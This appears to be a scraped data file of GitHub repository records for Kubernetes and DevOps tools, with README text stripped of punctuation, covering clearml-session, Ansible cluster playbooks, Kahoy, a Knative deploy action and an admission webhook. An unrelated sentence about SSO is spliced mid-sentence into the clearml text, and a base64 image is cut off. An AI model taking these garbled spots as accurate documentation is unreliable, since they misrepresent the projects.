allegroai,clearml-session,clearml#clearml-agent#jupyterlab#k8s#mlops#vscode,clearml session CLI for launching JupyterLab VSCode on a remote machine GitHub license https img shields io github license allegroai clearml session svg https img shields io github license allegroai clearml session svg PyPI pyversions https img shields io pypi pyversions clearml session svg https img shields io pypi pyversions clearml session svg PyPI version shields io https img shields io pypi v clearml session svg https img shields io pypi v clearml session svg PyPI status https img shields io pypi status clearml session svg https pypi python org pypi clearml session Slack Channel https img shields io badge slack 23clearml community blueviolet logo slack https join slack com t allegroai trains sharedinvite zt c0t13pty aVUZZW1TSSSg2vyIGVPBhg clearml session is a utility for launching detachable remote interactive sessions MacOS Windows Linux tldr CLI to launch remote sessions for JupyterLab VSCode server SSH inside any docker image What does it do Starting a clearml ob session from your local machine triggers the following ClearML allocates a remote instance GPU from your dedicated pool On the allocated instance it will spin jupyter lab vscode server SSH access for interactive usage i e development Clearml will start monitoring machine performance allowing DevOps to detect stale instances and spin them down Use cases for remote interactive sessions 1 Development requires resources not available on the current developer s machines 2 Team resource sharing e g how to dynamically assign GPUs to developers 3 Spin a copy of a previously executed experiment for remote debugging purposes openmouth 4 Scale out development to multiple clouds assign development machines on AWS GCP Azure in a seamless way Prerequisites An SSH client installed on your machine To verify open your terminal and execute ssh if you did not receive an error we are good to go At least one clearml agent running on a remote host See installation details https github com allegroai clearml agent Supported OS MacOS Windows Linux Secure Stable clearml session creates a single secure and encrypted connection to the remote machine over SSH SSH credentials are automatically generated by the CLI and contain fully random 32 bytes password All http connections are tunneled over the SSH connection allowing users to add additional services on the remote machine Furthermore all tunneled connections have a special stable network layer allowing you to refresh the underlying SSH connection without breaking any network sockets This means that if the network connection is unstable you can refresh the base SSH network tunnel without breaking JupyterLab VSCode server or your own SSH connection e h debugging over SSH with PyCharm How to use Interactive Session 1 run clearml session 2 select the requested queue resource 3 wait until a machine is up and ready 4 click on the link to the remote JupyterLab VSCode OR connect with the provided SSH details Notice You can also Select a docker image to execute in install required python packages run bash script pass git credentials etc See below for full CLI options Frequently Asked Questions How Does Clearml enable this The clearml session creates a new interactive Task in the system default project DevOps This Task is responsible for setting the SSH and JupyterLab VSCode on the host machine The local clearml session awaits for the interactive Task to finish with the initial setup then it connects via SSH to the host machine see safe and stable above and tunnels both SSH and JupyterLab over the SSH connection The end results is a local link which you can use to access the JupyterLab VSCode on the remote machine over a secure and encrypted connection How can this be used to scale up out development resources Clearml has a cloud autoscaler so you can easily and automatically spin machines for development There is also a default docker image to use when initiating a task This means that using clearml session s with the autoscaler enabled allows for turn key secure development environment inside a docker of your choosing Learn more about it here Does this fit Work From Home situations YES Install clearml agent on target machines inside the organization connect over your company VPN and use clearml session to gain access to a dedicated on prem machine with the docker of your choosing with out of the box support for any internal docker artifactory Learn more about how to utilize your office workstations and on prem machines here Tutorials Getting started Requirements clearml python package installed and configured see detailed instructions bash pip install clearml session clearml session docker nvcr io nvidia pytorch 20 11 py3 git credentilas Wait for the machine to spin up Expected CLI output would look something like console Creating new session New session created id 3d38e738c5ff458a9ec465e77e19da23 Waiting for remote machine allocation id 3d38e738c5ff458a9ec465e77e19da23 Status queued Status inprogress Remote machine allocated Setting remote environment Task id 3d38e738c5ff458a9ec465e77e19da23 Setup process details https app community clear ml projects 64ae77968db24b27abf86a501667c330 experiments 3d38e738c5ff458a9ec465e77e19da23 output log Waiting for environment setup to complete usually about 20 30 seconds Remote machine is ready Setting up connection to remote session Starting SSH tunnel Warning Permanently added 192 168 0 17 10022 ECDSA to the list of known hosts root 192 168 0 17 s password f7bae03235ff2a62b6bfbc6ab9479f9e28640a068b1208b63f60cb097b3a1784 Interactive session is running SSH ssh root localhost p 8022 password f7bae03235ff2a62b6bfbc6ab9479f9e28640a068b1208b63f60cb097b3a1784 Jupyter Lab URL http localhost 8878 token df52806d36ad30738117937507b213ac14ed638b8c336a7e VSCode server available at http localhost 8898 Connection is up and running Enter r or reconnect to reconnect the session for example after suspend Ctrl C or quit to abort remote session remains active or Shutdown to shutdown remote interactive session Click on the JupyterLab link http localhost 8878 token xyz Open your terminal clone your code start working Leaving a session and reconnecting from the same machine On the clearml session CLI terminal enter quit or press Ctrl C It will close the CLI but leaves the remote session running When you want to reconnect to it execute bash clearml session Then press Y or enter to reconnect to the already running session console clearml session launch interactive session Checking previous session Connect to active session id 3d38e738c5ff458a9ec465e77e19da23 Y n Shutting down a remote session On the clearml session CLI terminal enter shutdown case insensitive It will shut down the remote session free the resource and close the CLI console Enter r or reconnect to reconnect the session for example after suspend Ctrl C or quit to abort remote session rema Yes of course current SSO supports Google GitHub BitBucket SAML LDAP Usually with userpermissionsfully integrated to the LDAP ins active or Shutdown to shutdown remote interactive session shutdown Shutting down interactive session Interactive session ended Leaving interactive session Connecting to a running interactive session from a different machine Continue working on an interactive session from any machine In the clearml web UI go to DevOps project and find your interactive session Click on the ID button next to the Task name and copy the unique ID bash clearml session attach Click on the JupyterLab VSCode link or connect directly to the SSH session Debug a previously executed experiment If you have a previously executed experiment in the system you can create an exact copy of the experiment and debug it on the remote interactive session clearml session will replicate the exact remote environment add JupyterLab VSCode SSH and allow you interactively execute and debug the experiment on the allocated remote machine In the clearml web UI find the experiment Task you wish to debug Click on the ID button next to the Task name and copy the unique ID bash clearml session debugging Click on the JupyterLab VSCode link or connect directly to the SSH session CLI options bash clearml session help console clearml session CLI for launching JupyterLab VSCode on a remote machine usage clearml session h version attach ATTACH debugging DEBUGGING queue QUEUE docker DOCKER public ip true false vscode server true false git credentials true false user folder USERFOLDER packages PACKAGES PACKAGES requirements REQUIREMENTS init script INITSCRIPT config file CONFIGFILE remote gateway REMOTEGATEWAY base task id BASETASKID project PROJECT disable keepalive queue excluded tag QUEUEEXCLUDEDTAG QUEUEEXCLUDEDTAG queue include tag QUEUEINCLUDETAG QUEUEINCLUDETAG skip docker network password PASSWORD clearml session CLI for launching JupyterLab VSCode on a remote machine optional arguments h help show this help message and exit version Display the clearml session utility version attach ATTACH Attach to running interactive session default previous session debugging DEBUGGING Pass existing Task id experiment create a copy of the experiment on a remote machine and launch jupyter ssh for interactive access Example debugging queue QUEUE Select the queue to launch the interactive session on default previously used queue docker DOCKER Select the docker image to use in the interactive session on default previously used docker image or nvidia cuda 10 1 runtime ubuntu18 04 public ip true false If True register the public IP of the remote machine Set if running on the cloud Default false use for local on premises vscode server true false Installing vscode server code server on interactive session default true git credentials true false If true local git credentials file is sent to the interactive session default false user folder USERFOLDER Advanced Set the remote base folder default packages PACKAGES PACKAGES Additional packages to add supports version numbers default previously added packages examples packages torch 1 7 tqdm requirements REQUIREMENTS Specify requirements txt file to install when setting the interactive session Requirements file is read and stored in packages section as default for the next sessions Can be overridden by calling packages init script INITSCRIPT Specify BASH init script file to be executed when setting the interactive session Script content is read and stored as default script for the next sessions To clear the init script do not pass a file config file CONFIGFILE Advanced Change the configuration file used to store the previous state default clearmlsession json remote gateway REMOTEGATEWAY Advanced Specify gateway ip address to be passed to interactive session for use with k8s ingestion ELB base task id BASETASKID Advanced Set the base task ID for the interactive session default previously used Task Use none for the default interactive session project PROJECT Advanced Set the project name for the interactive session Task disable keepalive Advanced If set disable the transparent proxy always keeping the sockets alive Default false use transparent socket mitigating connection drops queue excluded tag QUEUEEXCLUDEDTAG QUEUEEXCLUDEDTAG Advanced Excluded queues with this specific tag from the selection queue include tag QUEUEINCLUDETAG QUEUEINCLUDETAG Advanced Only include queues with this specific tag from the selection skip docker network Advanced If set network host is not passed to docker assumes k8s network ingestion default false password PASSWORD Advanced Select ssh password for the interactive session default previously used one Notice all arguments are stored as new defaults for the next session,2020-12-22T19:25:04Z,2020-12-23T05:57:31Z,Python,Organization,1,2,1,4,main,allegroai-git,1,1,1,0,0,0,0
eoli3n,kubernetes-the-less-hard-way,ansible#ansible-playbooks#bootstrap#cluster#containers#k8s#kubernetes#onpremise,IN PROGRESS Kubernetes The Less Hard Way Ansible playbooks to learn how to host highly available Kubernetes cluster on premise with no SPOF Hard Way ansible hard way is kind of between Kubernetes The Hard Way https github com kelseyhightower kubernetes the hard way and KubeSpray https github com kubernetes sigs kubespray it automates cluster install from scratch it is a sandbox to learn how each components works RKE ansible rke automates production ready cluster install with Rancher Kubernetes Engine https rancher com docs rke latest en on top of RancherOS hosts https rancher com docs os v1 x en It has distributed persistent storage container registry true high availability with no Single Point Of Failure VMs provisionning Hostname OS for Hard Way OS for Rancher k8s controller1 Ubuntu Server 20 04 RancherOS k8s controller2 Ubuntu Server 20 04 RancherOS k8s controller3 Ubuntu Server 20 04 RancherOS k8s worker1 Ubuntu Server 20 04 RancherOS k8s worker2 Ubuntu Server 20 04 RancherOS k8s worker3 Ubuntu Server 20 04 RancherOS k8s loadbalancer1 Debian 10 Debian 10 k8s loadbalancer2 Debian 10 Debian 10 k8s storage1 Debian 10 Debian 10 k8s storage2 Debian 10 Debian 10 k8s storage3 Debian 10 Debian 10 Network and DNS All hosts needs a private IP on the same subnet Create DNS or hosts file entries for each VM Each VMs and your client should be able to resolve all hostnames Inventory cp ansible hosts template ansible hosts Add all hostnames in ansible hosts Firewall All trafic between VMs should not be filtered To access services from outside you should open in your firewall Service Port Destination ssh 22 tcp kube apiserver 6443 tcp k8s haproxy ingress 80 tcp 443 tcp k8s haproxy Run Ansible playbooks Please read playbooks before running Install SSH authorize your SSH public key then test if VMs are reachable ansible all m ping Hard way Read hard way ansible hard way RKE way Read rke ansible rke,2020-10-21T19:27:40Z,2020-11-17T20:59:52Z,HTML,User,2,2,0,141,master,eoli3n,1,0,0,0,0,0,0
techno-tim,techno-react,cd-pipeline#gitlab#homelab#k8s#kubernetes#react#reactjs#self-hosted#technotim,techno react A React JS application ready to host in Kubernetes with a CI CD pipeline ci https gitlab com techno tim techno react badges master pipeline svg https gitlab com techno tim techno react commits master For instructions please see https www youtube com watch v Xc94HJn1nNo https www youtube com watch v Xc94HJn1nNo Don t forget to this repo and fork it too It is also hosted in GitLab techno react gitlab repo https gitlab com techno tim techno react Available Scripts In the project directory you can run yarn start Runs the app in the development mode Open http localhost 3000 http localhost 3000 to view it in the browser The page will reload if you make edits You will also see any lint errors in the console yarn test Launches the test runner in the interactive watch mode See the section about running tests https facebook github io create react app docs running tests for more information yarn build Builds the app for production to the build folder It correctly bundles React in production mode and optimizes the build for the best performance The build is minified and the filenames include the hashes Your app is ready to be deployed See the section about deployment https facebook github io create react app docs deployment for more information yarn eject Note this is a one way operation Once you eject you cant go back If you arent satisfied with the build tool and configuration choices you can eject at any time This command will remove the single build dependency from your project Instead it will copy all the configuration files and the transitive dependencies webpack Babel ESLint etc right into your project so you have full control over them All of the commands except eject will still work but they will point to the copied scripts so you can tweak them At this point youre on your own You dont have to ever use eject The curated feature set is suitable for small and middle deployments and you shouldnt feel obligated to use this feature However we understand that this tool wouldnt be useful if you couldnt customize it when you are ready for it yarn release This will increment your package json update CHANGELOG md create a git tag based on the package version and push the commit and tag for you It also run postrelease git hook It does this using standard version https github com conventional changelog standard version Credits Created by Techno Tim with Social Media Twitch https www twitch tv TechnoTim Twitter https twitter com TechnoTimLive Discord https discord gg DJKexrJ Instagram https www instagram com techno tim Facebook https www facebook com TechnoTimLive GitHub https github com timothystewart6,2020-09-12T01:21:47Z,2020-12-26T06:24:59Z,JavaScript,Organization,1,2,0,14,master,timothystewart6#dependabot-preview[bot],2,0,0,1,0,1,3
slok,kahoy-app-deploy-example,ci#cicd#deploy#deployment#deployment-automation#k8s#kahoy#kubernetes,Kahoy app deploy example This example shows a simple and reliable way of deploying kubernetes apps easily Features Different environment deployments staging and production Multiple applications DRY using Helm templates Abstraction layer for deployment configuration config yaml Easy way of updating version of the apps Gitops based on github actions With dry run diff stages Kahoy for deployments Wait deployments finish and be ready using Kubedog Templated generic service ingress HPA deployment monitoring Optional app configuration inheritance How does it work We are using a single tool for each step Step 1 Generate Kubernetes manifests Step 2 Deploy Kubernetes manifests Step 3 Wait for these resources to be ready Step 1 Kubernetes manifests generation We have a generic helm chart ready to be used to generate the required manifests to deploy a service on Kubernetes We are only using helm for rendering the generic chart comes with Deployment service Autoscaling Ingress Monitoring We have set default values so applications only need to configure whatever they required This will create our abstraction layer so users don t need to craft huge YAML manifests to deploy a generic service charts charts Generic Helm chart gen gen Generated manifests these are the ones that will be deployed services services Our applications with their version configuration Services structure Our services have this structure services SERVICE ENV e g text app1 staging production app2 production This will generate 3 applications app1 in staging app1 in production app2 in production To configure the services we need config yaml and version files to generate the required Kubernetes YAMLs The envs can inherit the app level configuration and version if they don t redefine values however config yaml file must exist on app and env level can be empty e g text app1 config yaml app1 root config production config yaml app1 prod config version app1 prod version staging config yaml app1 staging config version app1 root version app2 config yaml app2 root config production config yaml app2 prod config version app2 prod version This would produce this app1 production app1 root config app1 prod config and app1 prod version app1 staging app1 root config app1 staging config and app1 root version app2 production app2 root config app2 prod config and app2 prod version Generated structure We want to deploy the apps by env so to give flexibility we are generating the envs in gen ENV SERVICE structure e g text gen production app1 resources yaml app2 resources yaml staging app1 resources yaml Now to deploy to different envs we can use gen production and gen staging or if we add more envs gen xxxxxx How to generate With make generate Will regenerate everything if any of the resources has been deleted e g an application and ingress these will be removed from the generated files All this generation logic can be checked in scripts generate sh scripts generate sh Step 2 Deploy to Kubernetes We will use Kahoy to deploy to Kubernetes Kahoy is a great tool for raw manifests it handles the changes based on 2 manifest states For example the manifests from one commit with the manifests from other commit that way knows what has been added changed deleted these are the main features we need Understands Kubernetes resources Has dry run and diff stages Understands Git Can deploys only the changes between 2 states e g K8s manifests of 2 git commits Garbage collects Uses kubectl under the hoods to deploy no magic This simplifies everything because we don t depend on a specific tool we are deploying Raw kubernetes manifests in a smart way Tomorrow you could change helm with Kustomize Deploy raw kubernetes manifests with our generated apps We don t mutate our manifests with labels Simple Kubectl applies done in a smart way All the dpeloy commands can be see in scripts deploy sh scripts deploy sh With this we will create some github action workflows of Dry run diff apply only changes apply full sync Step 3 Deployment Feedback Deploy feedback means the feedback that we get after a deployment not everyone wants this but some companies are used to wait unit the deployment is ready to mark the deployment as good or bad Kahoy solves this by giving the user an optional report of what applied With this report we can know what we need to wait for To wait we will use Kubedog Kubedog knows how to wait Kubernetes core workloads these are Deployments StatefulSets Jobs and Daemonsets So in a few words we will take the output of Kahoy and pass it through Kubedog so it will wait until all the resources are ready e g replicas of a deployment updated We also can wait for deleted resources for this we use kubetcl wait All this waiting logic can be checked in scripts wait sh scripts wait sh CI TODO helm https github com helm helm kahoy https github com slok kahoy kubedog https github com werf kubedog,2020-09-14T16:24:36Z,2020-09-16T06:57:12Z,Shell,User,2,2,0,33,master,slok,1,0,0,0,0,0,16
redhat-actions,kn-service-deploy,cloud#deployment#github-actions#k8s#knative#openshift#redhat#serverless,Knative Service Deploy CI checks workflow https github com redhat actions kn service deploy workflows CI 20Checks badge svg https github com redhat actions kn service deploy actions query workflow 3A 22CI Checks 22 App Build and Push https github com redhat actions kn service deploy workflows App 20Build 20and 20Push badge svg https github com redhat actions kn service deploy actions query workflow 3A 22App Build and Push 22 tag badge https img shields io github v tag redhat actions kn service deploy https github com redhat actions kn service deploy tags license badge https img shields io github license redhat actions kn service deploy LICENSE GitHub Action to deploy Knative Service https kn dev using Knative Client https github com knative client Pre requisites Kubernetes Cluster with Knative if you dont have an OpenShift cluster see try openshift com https try openshift com or try our new Developer Sandbox https developers redhat com developer sandbox Action Inputs Input Required Description servicename Yes The Knative Service Name servicenamespace No The Kubernetes Namespace to deploy to Defaults to current context s namespace serviceoperation No The kn service operation create update delete etc Defaults to create containerimage Yes The container image to use for service serviceparams No The extra service parameters to pass to the service registryuser No The registry user to use to create image pull secret Required if image registry is private registrypassword No The registry user password or token Required if image registry is private Action Outputs Output Description serviceurl Knative Service URL of the service created NOTE When username and password or token is provided to pull the image then the action will create a Kubernetes Secret of type docker registry with the docker username to be registryuser and docker password to be registrypassword The docker server value will be the first part of the containerimage value Passing extra service arguments This action provides basic options such as namespace service name image and operation to be configured There might be cases where you might want to pass extra arguments to the kn service in those cases you can use serviceparams as shown Consider an example that you want to add max scale 5 and min scale 1 then your action snippet will be yaml name Knative Service Deploy id knservicedeploy uses redhat actions kn service deploy v1 with servicename fruits app containerimage steps push tag to quay outputs registry path serviceparams max scale 5 min scale 1 Example The example below shows how the kn service deploy action can be used to deploy knative service using openshift cluster Here OpenShift is used as the Kubernetes platform you can use the oc login action https github com redhat actions oc login to login into the OpenShift cluster to perform kn actions yaml Login into the Openshift cluster with your username and password token name Authenticate and set context id oclogin uses redhat actions oc login v1 with openshiftserverurl secrets OPENSHIFTSERVER openshifttoken secrets OPENSHIFTTOKEN insecureskiptlsverify true namespace env NAMESPACE Deploy knative service using container image name Knative Service Deploy id knservicedeploy uses redhat actions kn service deploy v1 with servicename fruits app containerimage env IMAGENAME For a complete example see the example workflow github workflows example yml Contributing This is an open source project open to anyone This project welcomes contributions and suggestions Feedback Questions If you discover an issue please file a bug in GitHub Issues https github com redhat actions kn service deploy issues and we will fix it as soon as possible License MIT See LICENSE LICENSE for more information,2020-12-15T10:06:25Z,2020-12-24T18:56:50Z,Shell,Organization,3,2,1,34,main,kameshsampath#Divyansh42#github-actions[bot],3,0,0,0,0,0,7
justsimplify,service-admission-mutating-controller,admission-controller#admission-controllers#admission-webhook#controller#controllers#go#golang#k8s#kubernetes#mutating-admission-webhook#mutating-webhook,Admission Controller Mutating Webhook This is a simple admission controller written in golang Objective of the controller is that this controller intercepts incoming k8s services and checks if the name of the service has simple in it If the service contains simple this controller rejects that service and gives error as follows bash Error from server admission webhook service webhook admission controller svc denied the request service name should not contain simple word If the service doesn t have simple word it will mutate the service to add the following label mutated via controller true Setup Deployment Name service admission controller Service Name service webhook Controller Name service webhook Namespace admission controller Run setup sh file to generate certs and add it to secrets in k8s Generate Certs bash Setup export SERVICENAME service webhook export NAMESPACE admission controller export KEYNAME server key export CRTNAME server crt export CAKEY ca key export CACRT ca crt Create Namespace kubectl create namespace NAMESPACE Generate the CA cert and private key openssl req nodes new x509 keyout CAKEY out CACRT subj CN Service Admission Controller CA Generate the private key for the webhook server openssl genrsa out KEYNAME 2048 Generate a Certificate Signing Request CSR for the private key and sign it with the private key of the CA openssl req new key KEYNAME subj CN SERVICENAME NAMESPACE svc openssl x509 req CA CACRT CAkey CAKEY CAcreateserial out CRTNAME capemb64 openssl base64 A CACRT echo capemb64 Create secret kubectl n NAMESPACE create secret tls admission controller tls cert CRTNAME key KEYNAME How to run Create the certificate and put as secret in kubernetes Refer setup sh file All the files are stored in secrets directory Create go binary as follows bash CGOENABLED 0 GOOS linux go build o image service controller This will put service controller binary in image folder Navigate to image folder and build docker image here image name is service controller bash docker build t service controller Navigate to deployment folder and do bash kubectl apply f deployment yaml NOTE Replace CABUNDLEVALUE in deployment yaml to the value obtained from setup sh script Value is stored in variable capemb64 in script Secret is mounted in deployment yaml on the path secrets tls This path is used in code to do TLS Authentication Admission Controllers only run with TLS configuration References https kubernetes io docs reference access authn authz extensible admission controllers,2020-08-24T15:00:30Z,2020-09-17T22:28:21Z,Go,User,1,2,0,5,master,justsimplify,1,0,0,0,0,0,0
TateBrownJava,WebConsoleToContainerOfK8s,,WebConsoleToContainerOfK8s K8s client gowebkubeconfigweb K8s client gobeegokubeconfigk8s xterm jswebwebsocket 1 go mod 2 confkubeconfigpathkubeconfig config 3 go build 1 data image pngbase64 iVBORw0KGgoAAAANSUhEUgAABBYAAAMGCAYAAABGUwe AAAMY2lDQ1BJQ0MgUHJvZmlsZQAASImVVwdck0cbv3dkkrACYcgIe4kiM4CMEFYEAZmCqIQkkDBiTAgqbmpRwbpFFCdaZShaByB1IGKdRXFbR3GgUqnFKi5UvgsJ1Npv L7n97v3 nnuuf8zcve dwDodPJlsjxUF4B8aYE8PiKENTE1jUV6DMiACBBgA7T5AoWMExcXDaAM9X XNzegJZSrriquf47 V9EXihQCAJB0iDOFCkE xC0A4MUCmbwAAGIo1NvMKJCpsBhiAzkMEOI5KpytxitVOFONdw7aJMZzIW4CgEzj8 XZAGi3QT2rUJANebQfQ wmFUqkAOgYQBwoEPOFECdCPDI f5oKL4DYEdrLIK6GmJ35BWf23 gzh n5 OxhrM5rUMihEoUsjz r yzN 5b8POWQD3vYaGJ5ZLwqf1jDW7nTolSYBnGPNDMmVlVriN9JhOq6A4BSxcrIJLU9aiZQcGH9ABNiNyE NApiM4jDpXkx0Rp9ZpYknAcxXC3oTEkBL1Ezd4lIEZag4dwknxYfO4Sz5FyOZm49Xz7oV2XfpsxN4mj4b4lFvCH 10XixBSIqQBg1EJJcgzE2hAbKHITotQ2mHWRmBszZCNXxqvit4WYLZJGhKj5sfQseXi8xl6WrxjKFysRS3gxGlxRIE6MVNcHqxXwB M3hrhBJOUkDfGIFBOjh3IRikLD1Llj7SJpkiZf7L6sICReM7dXlhenscfJorwIld4aYlNFYYJmLj62AC5ONT8eLSuIS1THiWfk8MfFqePBC0E04IJQwAJK2DLBNJADJO09jT3wl3okHPCBHGQDEXDVaIZmpAyOSOEzARSB3yESAcXwvJDBUREohPpPw1r10xVkDY4WDs7IBU8gzgdRIA Vg7Okg57SwaPoUbyD 8CGGsebKqxf o4UBOt0SiHeFk6Q5bEMGIoMZIYTnTCTfFA3B Phs9g2NxxNu47FO1f9oQnhA7CQ8J1Qifh9lRJsfyrWMaDTsgfrsk488uMcXvI6YWH4AGQHTLjTNwUuOKe0A8HD4KevaCWq4lblTvr3 Q5nMEXNdfYUdwoKMWIEkxx HqmtrO21zCLqqJf1kcda ZwVbnDI1 7535RZyHso762xJZgB7Ez2EnsHHYUawQs7ATWhF3Ejqnw8Bp6PLiGhrzFD8aTC3kk DH1 hUVVLhVufW7fZRMwYKRDMLVBuMO002Sy7JFhewOPArIGLxpIJRI1nubu5uAKi KerX1Cvm4LcCYZ7 S1f8GoAA4cDAwNG dNFwTx 6Fm7zJ3 pHI7D14ERAGfLBEp5oVqHqx4E DbQgTvKBFjAL5YjzMgdeAN EAzCwDgQCxJBKpgC6yyG61kOZoA5YCEoAWVgJVgHNoKtYAeoBnvBAdAIjoKT4CdwAVwG18EduH66wHPQC96AfgRBSAgdYSAmiCVih7gg7ggbCUTCkGgkHklFMpBsRIookTnIN0gZshrZiGxHapAfkCPISeQc0oHcRh4g3cifyAcUQ2moAWqO2qOjUTbKQaPQRHQymo1OR4vQRehytAKtQvegDehJ9AJ6He1En6N9GMC0MCZmhblibIyLxWJpWBYmx ZhpVg5VoXVY83wn76KdWI92HuciDNwFu4K13AknoQL8On4PHwZvhGvxhvwNvwq gDvxT8T6AQzggvBj8AjTCRkE2YQSgjlhF2Ew4TTcDd1Ed4QiUQm0YHoA3djKjGHOJu4jLiZuI YQuwgPiL2kUgkE5ILKYAUS KTCkglpA2kPaQTpCukLtI7shbZkuxODienkaXkYnI5uZZ8nHyF JTcT9Gl2FH8KLEUIWUWZQVlJ6WZconSRemn6lEdqAHURGoOdSG1glpPPU29S32lpaVlreWrNUFLorVAq0Jrv9ZZrQda72n6NGcal5ZOU9KW03bTWmi3aa odLo9PZieRi gL6fX0E R79PfaTO0R2nztIXa87UrtRu0r2i 0KHo2OlwdKboFOmU6xzUuaTTo0vRtdfl6vJ15 lW6h7Rvanbp8fQG6MXq5evt0yvVu c3jN9kr69fpi UH R g79U qPGBjDhsFlCBjfMHYyTjO6DIgGDgY8gxyDMoO9Bu0GvYb6hp6GyYYzDSsNjxl2MjGmPZPHzGOuYB5g3mB MDI34hiJjJYa1RtdMXprPMI42FhkXGq8z i68QcTlkmYSa7JKpNGk3umuKmz6QTTGaZbTE b9owwGOE QjCidMSBEb YoWbOZvFms812mF006zO3MI8wl5lvMD9l3mPBtAi2yLFYa3HcotuSYRloKbFca3nC8jeWIYvDymNVsNpYvVZmVpFWSqvtVu1W dYO1knWxdb7rO ZUG3YNlk2a21abXptLW3H286xrbP9xY5ix7YT2623O2P31t7BPsV sX2j TMHYweeQ5FDncNdR7pjkON0xyrHa05EJ7ZTrtNmp8vOqLOXs9i50vmSC ri7SJx2ezSMZIw0nekdGTVyJuuNFeOa6FrneuDUcxR0aOKRzWOejHadnTa6FWjz4z 7Obllue20 3OGP0x48YUj2ke86e7s7vAvdL9mgfdI9xjvkeTx0tPF0 R5xbPW14Mr Fei71avT55 3jLveu9u31sfTJ8NvncZBuw49jL2Gd9Cb4hvvN9j q 9 P2K A74PeHv6t rn t 7OxDmNFY3eOfRRgHcAP2B7QGcgKzAjcFtgZZBXED6oKehhsEywM3hX8lOPEyeHs4bwIcQuRhxwOecv1487ltoRioRGhpaHtYfphSWEbw 6HW4dnh9eF90Z4RcyOaIkkREZFroq8yTPnCXg1vN5xPuPmjmuLokUlRG2MehjtHC2Pbh6Pjh83fs34uzF2MdKYxlgQy4tdE3svziFuetyPE4gT4iZUTngSPyZ TvyZBEbC1ITahDeJIYkrEu8kOSYpk1qTdZLTk2uS36aEpqxO6Zw4euLciRdSTVMlqU1ppLTktF1pfZPCJq2b1JXulV6SfmOyw SZk89NMZ2SN XYVJ2p KkHMwgZKRm1GR 5sfwqfl8mL3NTZq AK1gveC4MFq4VdosCRKtFT7MCslZnPcsOyF6T3S0OEpeLeyRcyUbJy5zInK05b3Njc3fnDuSl5O3LJ dn5B R6ktzpW3TLKbNnNYhc5GVyDqn 01fN71XHiXfpUAUkxVNBQbw8H5R6aj8VvmgMLCwsvDdjOQZB2fqzZTOvDjLedbSWU Lwou n43PFsxunWM1Z GcB3M5c7fPQ ZlzmudbzN 0fyuBRELqhdSF Yu LnYrXh18etvUr5pXmS aMGiR99GfFtXol0iL7m52H x1iX4EsmS9qUeSzcs VwqLD1f5lZWXvZxmWDZ e GfFfx3cDyrOXtK7xXbFlJXCldeWNV0Krq1Xqri1Y WjN TcNa1trSta XTV13rtyzfOt66nrl s6K6IqmDbYbVm74uFG88XplSOW TWablm56u1m4 cqW4C31W823lm39sE2y7db2iO0NVfZV5TuIOwp3PNmZvPPM9 zva3aZ7irb9Wm3dHdndXx1W41PTU2tWe2KOrROWde9J33P5b2he5vqXeu372PuK9sP9iv3 ZDxg83DkQdaD3IPlh yO7QpsOMw6UNSMOsht5GcWNnU2pTx5FxR1qb ZsP zjqx91HrY5WHjM8tuI49fii4wMnik70tchaek5mn3zUOrX1zqmJp661TWhrPx11 uxP4T dOsM5c JswNmj5 zOHTnPPt94wftCw0Wvi4d 9vr5cLt3e8Mln0tNl30vN3eM7Th JejKyauhV3 6xrt24XrM9Y4bSTdu3Uy 2XlLeOvZ7bzbL38p KX zoK7hLul93Tvld83u1 1q9Ov zq9O489CH1w8WHCwzuPBI eP1Y8 ti16An9SflTy6c1z9yfHe0O777826Tfup7Lnvf3lPyu9 umF44vDv0R MfF3om9XS lLwf XPbK5NXu156vW vi u6 yX T 7b0ncm76vfs92c pHx42j jI ljxSenT82foz7fHcgfGJDx5fzBowAGG5qVBcCfuwGgpwLAuAzPD5PUd75BQdT31EEE hNW3wsHxRuAetipjuvcFgD2w2a AHIHA6A6qicGA9TDY7hpRJHl4a7mosEbD HdwMArcwBIzQB8kg8M9G8eGPgE76jYbQBapqvvmiohwrvBtkAVum4sXAC EvU99Iscv 6BKgJP8HX L6oZiK838iF AAAAbGVYSWZNTQAqAAAACAAEARoABQAAAAEAAAA ARsABQAAAAEAAABGASgAAwAAAAEAAgAAh2kABAAAAAEAAABOAAAAAAAAAJAAAAABAAAAkAAAAAEAAqACAAQAAAABAAAEFqADAAQAAAABAAADBgAAAACb1 h2AAAACXBIWXMAABYlAAAWJQFJUiTwAABAAElEQVR4AezdZ7RtSVUv8I1gFgwYiRdEQcUAImIALkiQJkk3qaFpm6TShodjvOHn99WhzycMEWjophVoUgMSWpQgDUpSEMkoKo0kMWLEzDu Zf P89Zda 99zj3n3tu35xxj7VqrwqxZ 1Vr7ZqzZtW6zmd3aLVDH 4xwVNjUAj0Ag0Ao1AI9AINAKNQCPQCDQCjUAj0AhsjcDnbJ2zMzYCjUAj0Ag0Ao1AI9AINAKNQCPQCDQCjUAjMCBwveF6dcMb3nCM6utGoBFoBBqBRqARaAQagUagEWgEGoFGoBFoBGYRaI 